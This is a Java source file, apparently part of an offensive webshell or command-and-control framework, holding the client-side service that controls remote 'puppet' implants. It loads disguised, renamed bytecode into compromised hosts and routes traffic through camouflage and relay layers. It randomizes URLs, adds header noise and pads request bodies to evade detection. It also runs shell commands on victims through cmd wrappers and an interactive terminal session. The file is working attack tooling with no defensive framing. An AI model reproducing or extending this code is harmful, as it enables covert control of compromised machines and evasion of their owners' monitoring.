package org.leo.core.puppet.service;

import org.leo.core.entity.Puppet;
import org.leo.core.net.Communication;
import org.leo.core.net.impl.HttpCommunication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;
import org.leo.core.net.layer.PaddingStrategy;
import org.leo.core.net.layer.PaddingUtil;
import org.leo.core.net.layer.HeaderNoiseStrategy;
import org.leo.core.net.layer.HeaderNoiseGenerator;
import org.leo.core.net.layer.HttpSessionProfile;
import org.leo.core.net.layer.UrlGenerator;
import org.leo.core.net.layer.UrlStrategy;
import org.leo.core.payload.PayloadCodec;
import org.leo.core.rpc.PuppetRpcEnvelopeMapper;
import org.leo.core.rpc.PuppetOperation;
import org.leo.core.rpc.PuppetRpcRequest;
import org.leo.core.rpc.PuppetRpcResponse;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.core.util.javassist.CloneWithJavassist;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.ComponentClassNameStrategy;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Function;
import java.util.function.LongSupplier;

import static org.leo.core.rpc.PuppetRpcErrorCodes.isHostIdMismatch;

/** Shared Java component request pipeline. */
public class ComponentService {

    private static final int MIN_HOST_AFFINITY_ATTEMPTS = 8;

    private static final Logger log = LoggerFactory.getLogger(ComponentService.class);

    private Communication communication;

    private List<RequestLayer> requestLayers = new ArrayList<>();
    private List<ResponseLayer> responseLayers = new ArrayList<>();
    private PayloadCodec payloadCodec;
    private final Map<String, PayloadCodec> layerPayloadCodecs = new ConcurrentHashMap<>();

    protected String hostId;

    /** 最大请求总数，包含首次请求。 */
    private int maxReqCount = Puppet.DEFAULT_MAX_REQUEST_COUNT;

    /** per-puppet URL 随机化策略 */
    private UrlStrategy urlStrategy;

    /** URL 生成器（懒初始化） */
    private volatile UrlGenerator urlGenerator;

    /** per-puppet 请求体 Padding 策略 */
    private PaddingStrategy paddingStrategy;

    /** per-puppet Header 噪声注入策略 */
    private HeaderNoiseStrategy headerNoiseStrategy;

    /** per-puppet Component 运行时类名画像 */
    private ComponentClassNameStrategy componentClassNameStrategy;

    /** Header 噪声生成器（懒初始化） */
    private volatile HeaderNoiseGenerator headerNoiseGenerator;

    private long retryBaseDelayMillis = 150L;
    private long retryMaxDelayMillis = 2_000L;
    private RetrySleeper retrySleeper = Thread::sleep;
    private Function<String, Map<String, Object>> hostIdMismatchRecovery;

    private volatile ComponentLoadRegistry componentLoadRegistry = new ComponentLoadRegistry();

    /** pipeline 初始化标志 */
    private volatile boolean pipelineInitialized = false;

    // ================= 初始化 =================


//    public ComponentService(Communication communication) {
//        this.communication = communication;
//    }


    public String getHostId() {
        return hostId;
    }

    public void setHostId(String hostId) {
        this.hostId = hostId;
        rebuildTransportGenerators();
    }

    public ComponentService(Communication communication, List<RequestLayer> requestLayers, List<ResponseLayer> responseLayers) {
        this.communication = communication;
        this.requestLayers = requestLayers;
        this.responseLayers = responseLayers;
    }


    public void setRequestLayers(List<RequestLayer> requestLayers) {
        this.requestLayers = requestLayers;
        this.pipelineInitialized = false;
    }

    public void setResponseLayers(List<ResponseLayer> responseLayers) {
        this.responseLayers = responseLayers;
        this.pipelineInitialized = false;
    }

    public void setPayloadCodec(PayloadCodec payloadCodec) {
        this.payloadCodec = payloadCodec;
    }

    public void setUrlStrategy(UrlStrategy urlStrategy) {
        this.urlStrategy = urlStrategy;
        rebuildTransportGenerators();
    }

    public UrlStrategy getUrlStrategy() {
        return urlStrategy;
    }

    public void setPaddingStrategy(PaddingStrategy paddingStrategy) {
        this.paddingStrategy = paddingStrategy;
    }

    public PaddingStrategy getPaddingStrategy() {
        return paddingStrategy;
    }

    public void setMaxReqCount(int maxReqCount) {
        this.maxReqCount = Puppet.requireValidMaxRequestCount(maxReqCount);
    }

    public int getMaxReqCount() {
        return maxReqCount;
    }

    public void setHeaderNoiseStrategy(HeaderNoiseStrategy headerNoiseStrategy) {
        this.headerNoiseStrategy = headerNoiseStrategy;
        rebuildTransportGenerators();
    }

    public void setRetryBackoff(long baseDelayMillis, long maxDelayMillis) {
        this.retryBaseDelayMillis = Math.max(0L, baseDelayMillis);
        this.retryMaxDelayMillis = Math.max(this.retryBaseDelayMillis, maxDelayMillis);
    }

    void setRetrySleeper(RetrySleeper retrySleeper) {
        this.retrySleeper = retrySleeper == null ? Thread::sleep : retrySleeper;
    }

    public void setHostIdMismatchRecovery(
            Function<String, Map<String, Object>> hostIdMismatchRecovery) {
        this.hostIdMismatchRecovery = hostIdMismatchRecovery;
    }

    public HeaderNoiseStrategy getHeaderNoiseStrategy() {
        return headerNoiseStrategy;
    }

    public void setComponentClassNameStrategy(ComponentClassNameStrategy strategy) {
        this.componentClassNameStrategy = strategy;
    }

    public ComponentClassNameStrategy getComponentClassNameStrategy() {
        return componentClassNameStrategy;
    }

    private synchronized void initPipeline() throws Exception {
        if (pipelineInitialized) {
            return;
        }

        for (RequestLayer layer : requestLayers) {
            if (layer.getDisguise() != null) {
                layer.getDisguise().init();
            }
        }

        for (ResponseLayer layer : responseLayers) {
            if (layer.getDisguise() != null) {
                layer.getDisguise().init();
            }
        }

        pipelineInitialized = true;
    }

    /**
     * 获取指定 hostId 的已加载组件集合（供外部查询）
     */
    public Set<String> getLoadedComponentNames(String hostId) {
        return componentLoadRegistry.snapshot(hostId);
    }

    /**
     * 将 puppet 端报告的已加载组件名预填到本 Service 的缓存中，
     * 避免服务端重启后重复加载。
     */
    public void seedLoadedComponents(String hostId, Set<String> componentNames) {
        componentLoadRegistry.seed(hostId, componentNames);
    }

    public void setLoadedComponentCacheLimits(int maxHosts,
                                              int maxComponentsPerHost,
                                              long ttlMillis) {
        componentLoadRegistry.configureCache(maxHosts, maxComponentsPerHost, ttlMillis);
    }

    void setLoadedComponentCacheClock(LongSupplier clock) {
        componentLoadRegistry.setClock(clock);
    }

    public void setComponentLoadFailurePolicy(int threshold, long cooldownMillis) {
        componentLoadRegistry.configureFailurePolicy(threshold, cooldownMillis);
    }

    public void setComponentLoadRegistry(ComponentLoadRegistry registry) {
        if (registry != null) componentLoadRegistry = registry;
    }

    public void clearLoadedComponentCache() {
        componentLoadRegistry.clear();
    }

    // ================= 业务 =================

    public Map<String, Object> invokeComponent(String componentName, Map<String, Object> params) throws Exception {
        initPipeline();

        if (!componentLoadRegistry.contains(hostId, componentName)) {
            Map<String, Object> loadResult = loadComponent(componentName);
            if (loadResult == null) {
                Map<String, Object> err = new HashMap<>();
                err.put("code", Integer.valueOf(500));
                err.put("msg", "组件加载失败: " + componentName + "（返回为空）");
                return err;
            }
            Object codeObj = loadResult.get("code");
            boolean loaded = codeObj instanceof Number && ((Number) codeObj).intValue() == 200;
            if (!loaded) {
                return loadResult;
            }
        }

        Map<String, Object> requestParams = new HashMap<>(params);
        Object action = requestParams.remove("action");
        return run(PuppetOperation.COMPONENT_INVOKE, componentName,
                action == null ? null : String.valueOf(action), requestParams);
    }

    /**
     * 子类便捷调用:把 action + 参数 KV 序列封装成 invokeComponent 调用。
     * 用法:{@code call("ComponentX", "list", "key1", v1, "key2", v2)}。
     * 仅支持非 null 值;null 值会被跳过(语义同 if-not-null put)。
     * kvs 长度必须为偶数。
     */
    protected Map<String, Object> call(String componentName, String action, Object... kvs) throws Exception {
        if (kvs != null && (kvs.length & 1) != 0) {
            throw new IllegalArgumentException("call(...) kvs 必须为偶数(key,value 成对)");
        }
        Map<String, Object> params = new HashMap<>();
        params.put("action", action);
        if (kvs != null) {
            for (int i = 0; i < kvs.length; i += 2) {
                Object key = kvs[i];
                Object value = kvs[i + 1];
                if (value != null && key != null) {
                    params.put(key.toString(), value);
                }
            }
        }
        return invokeComponent(componentName, params);
    }

    public Map<String, Object> loadComponent(String componentName) throws Exception {
        return componentLoadRegistry.loadOnce(hostId, componentName,
                () -> performLoadComponent(componentName));
    }

    public Map<String, Object> reloadComponent(String componentName) throws Exception {
        String revision = UUID.randomUUID().toString().replace("-", "");
        componentLoadRegistry.invalidate(hostId, componentName);
        Map<String, Object> result = componentLoadRegistry.loadOnce(hostId, componentName,
                () -> performLoadComponent(componentName, revision));
        if (result != null && Integer.valueOf(200).equals(result.get("code"))) {
            result.put("cached", Boolean.FALSE);
            result.put("reloaded", Boolean.TRUE);
            result.put("msg", "组件重新加载成功");
        }
        return result;
    }

    private Map<String, Object> performLoadComponent(String componentName) throws Exception {
        return performLoadComponent(componentName, null);
    }

    private Map<String, Object> performLoadComponent(String componentName,
                                                     String revision) throws Exception {
        Map<String, Object> results = new HashMap<>();


        String componentSeed = transportSeed() + "|" + componentName
                + (revision == null ? "" : "|" + revision);
        String newClassName = componentClassNameStrategy == null
                ? ClassNameGenerator.generateComponentClassName(transportSeed(), componentName)
                : componentClassNameStrategy.resolve(transportSeed(), componentName);
        if (revision != null && !revision.isEmpty()) {
            newClassName = revisionClassName(newClassName, revision);
        }
        byte[] bytecode = CloneWithJavassist.cloneClass(componentName, newClassName,
                ClassNameGenerator.stableSeed(componentSeed));

        if (bytecode == null) {
            results.put("code", 500);
            results.put("msg", "无法获取组件字节码");
            return results;
        }

        bytecode = new ClassFileMinimizer().transform(bytecode);

        Map<String, Object> params = new HashMap<>();
        params.put("bytecode", bytecode);

        results = run(PuppetOperation.COMPONENT_LOAD, componentName, null, params);

        if (results != null && Integer.valueOf(200).equals(results.get("code"))) {
            results.put("msg", "插件加载成功");
        }

        return results;
    }

    private String revisionClassName(String baseClassName, String revision) {
        String suffix = revision.length() > 12 ? revision.substring(0, 12) : revision;
        return baseClassName + "Revision" + suffix;
    }

    // ================= 核心执行 =================

    protected Map<String, Object> run(PuppetOperation operation, String component,
                                      String action, Map<String, Object> params) {
        String requestId = UUID.randomUUID().toString();
        PuppetRpcRequest envelope = new PuppetRpcRequest(
                requestId, operation, hostId, component, action, params);

        if (communication instanceof HttpCommunication && !requestLayers.isEmpty()) {
            applyHeaders((HttpCommunication) communication);
        }

        int attempt = 0;
        int requestAttempts = maxReqCount;
        int maxAttempts = envelope.hostId() == null
                ? requestAttempts : Math.max(requestAttempts, MIN_HOST_AFFINITY_ATTEMPTS);
        Map<String, Object> result = new HashMap<>();
        PuppetRpcResponse hostMismatchResponse = null;

        while (attempt < maxAttempts) {
            attempt++;
            try {
                HttpCommunication http = communication instanceof HttpCommunication
                        ? (HttpCommunication) communication : null;
                if (http != null) {
                    http.setRequestProfileHeaders(HttpSessionProfile.headers(transportSeed(), http.getUrl()));
                }

                // 会话级 URL：同一 hostId 与 endpoint 保持稳定。
                if (urlGenerator != null && communication instanceof HttpCommunication) {
                    String nextUrl = urlGenerator.nextUrl(((HttpCommunication) communication).getMethod());
                    ((HttpCommunication) communication).setRequestUrl(nextUrl);
                }

                // seed 模式下 Header 集合和值在会话内保持稳定。
                if (headerNoiseGenerator != null && communication instanceof HttpCommunication) {
                    java.util.Map<String, String> noiseHeaders = headerNoiseGenerator.generate();
                    ((HttpCommunication) communication).setRequestNoiseHeaders(noiseHeaders);
                }

                Map<String, Object> wirePayload = PuppetRpcEnvelopeMapper.toMap(envelope);
                PaddingUtil.pad(wirePayload, paddingStrategy, estimateBytes(wirePayload),
                        requestId + "|0|" + transportSeed());
                EncodedPayload encoded = encode(wirePayload, requestId);
                byte[] resp = communication.sendRequest(encoded.data());
                result = decode(resp, encoded.requestIds());

                if ("success".equals(result.get("reqStatus"))) {
                    result.remove("reqStatus");
                    PuppetRpcResponse response = PuppetRpcEnvelopeMapper.responseFromMap(result);
                    if (isHostIdMismatch(response)) {
                        hostMismatchResponse = response;
                        if (attempt < maxAttempts) {
                            resetTransportAffinity();
                            continue;
                        }
                        return recoverHostAffinity(envelope.hostId(), response);
                    }
                    return PuppetRpcEnvelopeMapper.toResultMap(response);
                }
            } catch (Exception e) {
                result = new HashMap<>();
                result.put("reqStatus", "fail");
                // e.getMessage() 对 NPE 等是 null，用类名兜底
                String msg = e.getMessage();
                result.put("reqMsg", msg != null ? msg : e.getClass().getName() + " (no message)");
                log.warn("[ComponentService] 请求失败 operation={} component={} attempt={} type={} message={}",
                        operation,
                        component,
                        attempt,
                        e.getClass().getName(),
                        msg);
                log.debug("[ComponentService] 请求失败详情 operation={} component={} attempt={}",
                        operation, component, attempt, e);
            }

            if (attempt >= requestAttempts) {
                if (hostMismatchResponse != null) {
                    return recoverHostAffinity(envelope.hostId(), hostMismatchResponse);
                }
                String errMsg = (String) result.get("reqMsg");
                result.remove("reqStatus");
                result.remove("reqMsg");
                // 通信失败时 result 为空 map，补充明确的错误信息
                if (!result.containsKey("code")) {
                    result.put("code", Integer.valueOf(500));
                    String finalMsg = errMsg != null ? errMsg : "通信失败，请检查 Puppet 连接";
                    result.put("msg", finalMsg);
                    log.warn("[ComponentService] 重试结束 component={} operation={} message={}",
                            component, operation, finalMsg);
                }
                return result;
            }
            sleepBeforeRetry(requestId, attempt);
        }
        return result;
    }

    private Map<String, Object> recoverHostAffinity(
            String expectedHostId, PuppetRpcResponse mismatchResponse) {
        Function<String, Map<String, Object>> recovery = hostIdMismatchRecovery;
        if (recovery == null) return PuppetRpcEnvelopeMapper.toResultMap(mismatchResponse);
        try {
            Map<String, Object> recovered = recovery.apply(expectedHostId);
            return recovered != null ? recovered : PuppetRpcEnvelopeMapper.toResultMap(mismatchResponse);
        } catch (RuntimeException e) {
            log.warn("[ComponentService] HostId 会话恢复失败 expectedHostId={} message={}",
                    expectedHostId, e.getMessage(), e);
            Map<String, Object> result = new LinkedHashMap<>();
            result.put("code", Integer.valueOf(503));
            result.put("errorCode", org.leo.core.rpc.PuppetRpcErrorCodes.HOST_ID_UNAVAILABLE);
            result.put("msg", "目标实例重新握手失败: "
                    + (e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage()));
            return result;
        }
    }

    private void resetTransportAffinity() {
        if (communication instanceof HttpCommunication http) http.resetSessionAffinity();
    }

    // ================= encode =================

    private EncodedPayload encode(Map<String, Object> params, String requestId) throws Exception {
        if (requestLayers == null || requestLayers.isEmpty()) {
            throw new IllegalStateException("requestLayers 为空，无法编码请求（puppet 未配置 reqDisguiseId？）");
        }

        List<String> requestIds = new ArrayList<>();
        requestIds.add(requestId);
        byte[] temp = encodeLayer(requestLayers.get(0), params);

        for (int i = 1; i < requestLayers.size(); i++) {
            RequestLayer layer = requestLayers.get(i);
            RequestLayer beforeLayer = requestLayers.get(i-1);
            Map<String, String> header = beforeLayer.getRelayHeaders();
            String relayRequestId = UUID.randomUUID().toString();
            Map<String, Object> relayParams = new HashMap<>();
            relayParams.put("url", beforeLayer.getUrl());
            relayParams.put("headers", header);
            relayParams.put("body", temp);
            PuppetRpcRequest relay = new PuppetRpcRequest(
                    relayRequestId, PuppetOperation.RELAY, null, null, null, relayParams);
            Map<String, Object> relayPayload = PuppetRpcEnvelopeMapper.toMap(relay);
            PaddingUtil.pad(relayPayload, paddingStrategy, estimateBytes(relayPayload),
                    relayRequestId + "|" + i + "|" + transportSeed());
            temp = encodeLayer(layer, relayPayload);
            requestIds.add(relayRequestId);
        }

        return new EncodedPayload(temp, requestIds);
    }

    // ================= decode =================

    private Map<String, Object> decode(byte[] data, List<String> requestIds) {
        Map<String, Object> result = new HashMap<>();

        try {
            if (responseLayers.size() != requestIds.size()) {
                throw new IllegalStateException("请求层与响应层数量不一致");
            }
            byte[] temp = data;
            Map<String, Object> map = null;

            for (int i = 0; i < responseLayers.size(); i++) {
                map = decodeLayer(responseLayers.get(i), temp);
                String expectedRequestId = requestIds.get(requestIds.size() - 1 - i);
                if (!PuppetRpcEnvelopeMapper.isEnvelopeResponse(map, expectedRequestId)) {
                    Object actualRequestId = map == null ? null : map.get("requestId");
                    throw new IllegalStateException("响应 requestId 不匹配"
                            + "（layer=" + i
                            + ", expected=" + expectedRequestId
                            + ", actual=" + actualRequestId
                            + ", code=" + (map == null ? null : map.get("code")) + "）");
                }

                if (i == responseLayers.size() - 1) {
                    result = map;
                } else {
                    PuppetRpcResponse relayResponse = PuppetRpcEnvelopeMapper.responseFromMap(map);
                    if (!relayResponse.isSuccess() || !(relayResponse.data() instanceof Map<?, ?> relayData)
                            || !(relayData.get("body") instanceof byte[] body)) {
                        throw new IllegalStateException("Relay 响应缺少 data.body");
                    }
                    temp = body;
                }
            }

            // result 可能为 null（PayloadCodec 解码结果为空）
            if (result == null) {
                log.warn("[ComponentService] decode: Disguise 返回 null，data.length={}",
                        data == null ? -1 : data.length);
                result = new HashMap<>();
                result.put("reqStatus", "fail");
                result.put("reqMsg", "PayloadCodec 解码结果为空");
                return result;
            }

            // result 为空 map 说明响应解析异常
            if (result.isEmpty()) {
                log.warn("[ComponentService] decode: 解码结果为空 map，data.length={}",
                        data == null ? -1 : data.length);
                result.put("reqStatus", "fail");
                result.put("reqMsg", "响应解码结果为空（Puppet 可能未发送响应体）");
            } else {
                result.put("reqStatus", "success");
            }

        } catch (Exception e) {
            // 注意：此处 result 可能已被赋值为 null（来自上面的 result = map），
            // 直接 result.clear() 会再次 NPE 并逃出 catch，必须先重建。
            result = new HashMap<>();
            result.put("reqStatus", "fail");
            String msg = e.getMessage();
            String reqMsg = msg != null ? msg : e.getClass().getName() + " (no message)";
            result.put("reqMsg", reqMsg);
            log.warn("[ComponentService] 响应解析失败 message={} data.length={}",
                    reqMsg, data == null ? -1 : data.length);
            log.debug("[ComponentService] 响应解析失败详情", e);
        }

        return result;
    }

    private byte[] encodeLayer(RequestLayer layer, Map<String, Object> payload) throws Exception {
        return layer.encodeTraffic(payloadCodec(layer.getPayloadKey()).encode(payload));
    }

    private Map<String, Object> decodeLayer(ResponseLayer layer, byte[] body) throws Exception {
        return payloadCodec(layer.getPayloadKey()).decode(layer.decodeTraffic(body));
    }

    private PayloadCodec requirePayloadCodec() {
        if (payloadCodec == null) {
            throw new IllegalStateException("Java PayloadCodec 未配置");
        }
        return payloadCodec;
    }

    private PayloadCodec payloadCodec(String layerPayloadKey) {
        if (layerPayloadKey == null || layerPayloadKey.trim().isEmpty()) {
            return requirePayloadCodec();
        }
        return layerPayloadCodecs.computeIfAbsent(layerPayloadKey.trim(), PayloadCodec::new);
    }

    private record EncodedPayload(byte[] data, List<String> requestIds) { }

    // ================= headers 核心逻辑 =================

    private void applyHeaders(HttpCommunication http) {
        if (requestLayers == null || requestLayers.isEmpty()) {
            return;
        }

        RequestLayer outermost = requestLayers.get(requestLayers.size() - 1);

        // 写入 HttpCommunication
        for (Map.Entry<String, String> entry : outermost.getMergedHeaders().entrySet()) {
            http.addHeader(entry.getKey(), entry.getValue());
        }
    }

    private void rebuildTransportGenerators() {
        if (communication instanceof HttpCommunication) {
            HttpCommunication http = (HttpCommunication) communication;
            this.urlGenerator = urlStrategy != null && urlStrategy.isEnabled()
                    ? new UrlGenerator(urlStrategy, http.getUrl(), transportSeed()) : null;
        } else {
            this.urlGenerator = null;
        }
        this.headerNoiseGenerator = headerNoiseStrategy != null && headerNoiseStrategy.isEnabled()
                ? new HeaderNoiseGenerator(headerNoiseStrategy, transportSeed()) : null;
    }

    private String transportSeed() {
        String endpoint = communication instanceof HttpCommunication
                ? ((HttpCommunication) communication).getUrl() : "java";
        return (hostId == null || hostId.trim().isEmpty() ? "bootstrap" : hostId) + "|" + endpoint;
    }

    private int estimateBytes(Object value) {
        if (value == null) return 4;
        if (value instanceof byte[]) return ((byte[]) value).length + 8;
        if (value instanceof CharSequence) {
            return value.toString().getBytes(StandardCharsets.UTF_8).length + 4;
        }
        if (value instanceof Map<?, ?>) {
            int total = 2;
            for (Map.Entry<?, ?> entry : ((Map<?, ?>) value).entrySet()) {
                total += estimateBytes(String.valueOf(entry.getKey())) + estimateBytes(entry.getValue()) + 2;
            }
            return total;
        }
        if (value instanceof Iterable<?>) {
            int total = 2;
            for (Object item : (Iterable<?>) value) total += estimateBytes(item) + 1;
            return total;
        }
        return String.valueOf(value).getBytes(StandardCharsets.UTF_8).length + 2;
    }

    private void sleepBeforeRetry(String requestId, int attempt) {
        if (retryBaseDelayMillis <= 0L) return;
        int shift = Math.min(20, Math.max(0, attempt - 1));
        long exponential = retryBaseDelayMillis > Long.MAX_VALUE >> shift
                ? Long.MAX_VALUE : retryBaseDelayMillis << shift;
        long capped = Math.min(retryMaxDelayMillis, exponential);
        long hash = 1125899906842597L;
        String material = requestId + '|' + attempt;
        for (int index = 0; index < material.length(); index++) hash = 31L * hash + material.charAt(index);
        double factor = 0.75d + (Math.floorMod(hash, 501L) / 1000.0d);
        long delay = Math.max(1L, Math.min(retryMaxDelayMillis, Math.round(capped * factor)));
        try {
            retrySleeper.sleep(delay);
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            throw new IllegalStateException("Java Puppet 重试等待被中断", interrupted);
        }
    }

    @FunctionalInterface
    interface RetrySleeper {
        void sleep(long millis) throws InterruptedException;
    }

    // ================= 服务端 exec 辅助（子类直接调用）=================

    /**
     * 将命令包装为 Windows cmd /c 形式，并强制 UTF-8 代码页。
     * Linux/macOS 子类在 OS 检测后直接传入原始命令，无需调用此方法。
     */
    protected String winCmd(String cmd) {
        return "cmd /c \"chcp 65001 > nul & " + cmd + "\"";
    }

    /**
     * 快速同步执行，适合确定在 2s 内完成的命令（reg query、netsh、nmcli 等）。
     * 无超时保护，子类需确保命令一定会快速退出。
     */
    protected String execFast(String cmd) throws Exception {
        Map<String, Object> params = new HashMap<>();
        params.put("cmd", cmd.getBytes("UTF-8"));
        Map<String, Object> result = invokeComponent("ExecCommandSimpleComponent", params);
        return extractString(result);
    }

    /**
     * 带超时的同步执行（哨兵模式）。
     * 在 puppet 侧开启 shell 会话，写入命令 + 哨兵，等待哨兵出现或超时。
     *
     * @param cmd            要执行的命令
     * @param timeoutSeconds 超时秒数（1~120）
     * @return 命令输出（已去除哨兵行，超时时追加 WARN 行）
     */
    protected String execWithTimeout(String cmd, int timeoutSeconds) throws Exception {
        int clampedTimeout = Math.max(1, Math.min(timeoutSeconds, 120));

        // ── 1. 创建 shell 会话，等待就绪 ──
        String processId = java.util.UUID.randomUUID().toString();
        sendToTerminal("\n", processId);

        long readyDeadline = System.currentTimeMillis() + 5000;
        while (System.currentTimeMillis() < readyDeadline) {
            Thread.sleep(300);
            try {
                String probe = readFromTerminal(processId);
                if (probe != null && !probe.isEmpty()) break;
            } catch (Exception ignored) {}
        }

        // ── 2. 写入命令 + 哨兵 ──
        String sentinel = "__DONE_" + processId.replace("-", "").substring(0, 12) + "__";
        sendToTerminal(cmd + "\n", processId);
        sendToTerminal("echo " + sentinel + "\n", processId);

        // ── 3. 轮询直到哨兵或超时 ──
        long deadline = System.currentTimeMillis() + (long) clampedTimeout * 1000;
        StringBuilder accumulated = new StringBuilder();
        boolean sentinelFound = false;
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(400);
            String chunk = readFromTerminal(processId);
            if (chunk != null && !chunk.isEmpty()) {
                accumulated.append(chunk);
                if (accumulated.indexOf(sentinel) >= 0) {
                    sentinelFound = true;
                    break;
                }
            }
        }

        // ── 4. 停止会话 ──
        try {
            Map<String, Object> stopParams = new HashMap<>();
            stopParams.put("processId", processId.getBytes("UTF-8"));
            stopParams.put("op", Integer.valueOf(2));
            invokeComponent("ExecCommandComponent", stopParams);
        } catch (Exception ignored) {}

        // ── 5. 去除哨兵行及其后内容，修剪尾部空行 ──
        String result = accumulated.toString();
        int idx = result.indexOf(sentinel);
        if (idx >= 0) result = result.substring(0, idx);
        int end = result.length();
        while (end > 0 && (result.charAt(end - 1) == '\n' || result.charAt(end - 1) == '\r')) end--;
        result = result.substring(0, end);

        if (!sentinelFound) {
            result += "\n[WARN: command timed out after " + clampedTimeout + "s, output may be incomplete]";
        }
        return result;
    }

    private void sendToTerminal(String text, String processId) throws Exception {
        Map<String, Object> p = new HashMap<>();
        p.put("processId", processId.getBytes("UTF-8"));
        p.put("op", Integer.valueOf(0));
        p.put("cmd", text.getBytes("UTF-8"));
        invokeComponent("ExecCommandComponent", p);
    }

    private String readFromTerminal(String processId) throws Exception {
        Map<String, Object> p = new HashMap<>();
        p.put("processId", processId.getBytes("UTF-8"));
        p.put("op", Integer.valueOf(1));
        Map<String, Object> result = invokeComponent("ExecCommandComponent", p);
        return extractString(result);
    }

    /** 从 invokeComponent 结果的 data 字段中提取字符串输出。 */
    protected String extractString(Map<String, Object> results) {
        if (results == null) return "";
        Object data = results.get("data");
        if (data instanceof byte[]) {
            try { return new String((byte[]) data, "UTF-8"); } catch (Exception e) { return ""; }
        }
        if (data instanceof String) return (String) data;
        return "";
    }
}
